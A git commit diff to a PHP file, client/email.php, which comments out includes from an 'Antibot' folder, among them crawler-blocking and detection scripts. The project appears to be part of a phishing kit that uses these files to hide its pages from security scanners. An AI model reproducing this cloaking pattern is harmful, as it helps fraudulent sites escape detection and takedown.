94b11faa94f35f4cf34527d141b882b690c3a19f
kingodili05 <123820080+kingodili05@users.noreply.github.com>
2024-09-11 16:20:14 +0200

    Update email.php

--- client/email.php
+++ client/email.php
@@ -2,10 +2,10 @@
 
 error_reporting(0);
 
-include('..Antibot/Bot-Crawler.php');
-include('..Antibot/Dila_DZ.php');
-include('..Antibot/blockers.php');
-include('..Antibot/detects.php');
+// include('..Antibot/Bot-Crawler.php');
+// include('..Antibot/Dila_DZ.php');
+// include('..Antibot/blockers.php');
+// include('..Antibot/detects.php');
 
 session_start();
 $id = $_GET['id'];
